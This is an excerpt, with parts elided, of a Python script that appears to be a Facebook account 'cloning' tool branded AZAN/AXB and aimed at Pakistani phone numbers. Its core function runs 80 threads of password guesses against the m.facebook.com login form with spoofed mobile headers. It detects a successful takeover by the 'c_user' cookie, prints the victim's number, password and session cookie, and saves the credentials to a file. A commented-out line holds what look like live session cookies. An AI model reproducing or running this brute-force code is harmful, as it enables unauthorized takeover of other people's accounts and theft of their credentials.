...
psb('\x1b[1;31mCLONING START PLEASE WAIT ..........')
time.sleep(3)
...
def main():
    ...
    banner()
    print(f' ')
    print(f'{M}╔══[ [•] TOOL NAME : {H}A Z A N-007')
    print(f'{M}║══[ [•] YOR IP    : ')
    print(f'{M}║══[ [•] VERSION   : {H}1.0.9')
    print(f'{M}╚══[ [•] TOOL NAME : {H}AXB RANDOM\n')
  ...
  #  linex()
    ...
    with ThreadPool(max_workers=80) as manshera:    
       ...
       # print(f'  {M}  ╚════════════════════════════════════════╝ {P}')
        ...
        print(f"{P}[{H}•{P}]  {WHITE}COUNTRY YOU CHOOSE    : {RED}PAKISTAN 🇵🇰")
...
def m(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            web_fb = session.get('https://m.facebook.com').text
           data = {
            ...
            "email":uid,
            "next":"https://m.facebook.com/login/device-based/regular/login/?refsrc",
            "flow":"login_no_pain",
            "pass":ps,
            "login":"Log In"}
           headers = {
    ...
    # 'cookie': 'datr=A-uSYyz8cUleqqFPPzptaWrf; sb=A-uSY-6PSrql2aesSydmbgEY; m_pixel_ratio=2; dnonce=AWnYtACyPTULkih3KHFK_hB-IfWti-WpYzI-TCp0FB4HYlF6uJjZMy9I9sYImHdJCZkwqSzxziZH8znz2ahrYIEi; fr=0q9EKav0g1QLJTo3F.AWV_ck6jc-hrbhUudWyjNst0Dgc.BjkusD.9n.AAA.0.0.Bj1PVL.AWVYJvotjd4; wd=360x680',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
            ...
            if 'c_user' in log_cookies:
                ...
                print('    \033[1;92m[AXB-SUCCESSFUL] '+uid+' | '+ps+'\033[0;97m')
                print(f'    {B}[NUMBER📳] {K}'+uid+'  ')
                print(f'    {B}[COOKI💉] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/AXB-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mAZAN","\x1b[1;92mAXB","\x1b[1;93mAXB","\x1b[1;94mAXB","\x1b[1;95mAXB","\x1b[1;96mAXB","\x1b[1;97mAXB","\x1b[1;91mAZAN","\x1b[1;92mAZAN","\x1b[1;93mAZAN","\x1b[1;94mAZAN","\x1b[1;95mAZAN","\x1b[1;96mAZAN"])
